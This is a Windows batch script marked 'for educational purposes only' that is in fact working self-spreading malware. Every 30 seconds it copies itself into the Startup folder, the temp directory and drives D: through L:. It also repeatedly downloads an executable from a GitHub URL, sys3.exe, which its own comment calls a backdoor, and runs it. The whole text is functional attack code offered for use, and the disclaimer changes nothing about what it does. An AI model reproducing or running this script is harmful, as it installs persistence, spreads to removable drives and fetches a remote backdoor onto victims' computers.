goto MAIN_SCRIPT

                                       FOR EDUCATIONAL PURPOSES ONLY

                                             --dont continue before reading the readme.md file
                                             --execute this script in a contained environment
                                             --dont double click this file in windows os

:MAIN_SCRIPT
:LOOP
REM                                          --copying occurs every 30 seconds, backdoor script is downloaded every 1 hour 
powershell.exe -WindowStyle hidden -command ""
REM                                          --now process runs in background
FOR /L %%A IN (1,1,120) DO (
copy %~n0%~x0 "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%~n0%~x0"
copy %~n0%~x0 "%temp%\%~n0%~x0"
copy %~n0%~x0 "D:\%~n0%~x0"
copy %~n0%~x0 "E:\%~n0%~x0"
copy %~n0%~x0 "F:\%~n0%~x0"
copy %~n0%~x0 "G:\%~n0%~x0"
copy %~n0%~x0 "H:\%~n0%~x0"
copy %~n0%~x0 "I:\%~n0%~x0"
copy %~n0%~x0 "J:\%~n0%~x0"
copy %~n0%~x0 "K:\%~n0%~x0"
copy %~n0%~x0 "L:\%~n0%~x0"
timeout /t 30 /nobreak
)
cd %appdata%
taskkill /F /T /IM %~n0%~x0
powershell.exe -command "wget "https://github.com/MASMob2022/sys/raw/main/sys3.exe" -outfile "sys3.exe""
start sys3.exe
cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
goto LOOP